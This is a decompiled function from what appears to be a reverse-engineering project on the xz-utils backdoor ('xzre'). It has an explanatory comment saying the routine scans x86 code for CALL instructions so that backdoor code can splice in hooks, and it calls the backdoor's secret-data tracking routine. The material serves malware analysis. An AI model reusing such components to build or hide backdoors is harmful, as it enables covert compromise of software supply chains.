// /home/kali/xzre-ghidra/xzregh/100C90_find_call_instruction.c
// Function: find_call_instruction @ 0x100C90
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_call_instruction(u8 * code_start, u8 * code_end, u8 * call_target, dasm_ctx_t * dctx)


/*
 * AutoDoc: Initialises a scratch decoder (or reuses the caller’s `dctx`) and decodes forward from `code_start` to `code_end`, skipping undecodable bytes along the way.
 * It looks for the normalised CALL opcode (`0x168`) and, when `call_target` is non-null, requires that the rel32 destination computed from `instruction + instruction_size + operand` matches that target.
 * The function returns TRUE with the context still describing the CALL so that higher-level code can splice hooks immediately after the call site.
 */

#include "xzre_types.h"

BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_t *dctx)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  byte bVar4;
  dasm_ctx_t scratch_ctx;
  
  bVar4 = 0;
  BVar1 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
  if (BVar1 != FALSE) {
    pdVar3 = &scratch_ctx;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)&pdVar3->instruction = 0;
      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &scratch_ctx;
    }
    while (code_start < code_end) {
      BVar1 = x86_dasm(dctx,code_start,code_end);
      if (BVar1 == FALSE) {
        code_start = code_start + 1;
      }
      else {
        if ((*(int *)(dctx->opcode_window + 3) == 0x168) &&
           ((call_target == (u8 *)0x0 ||
            (dctx->instruction + dctx->instruction_size + dctx->operand == call_target)))) {
          return TRUE;
        }
        code_start = code_start + dctx->instruction_size;
      }
    }
  }
  return FALSE;
}

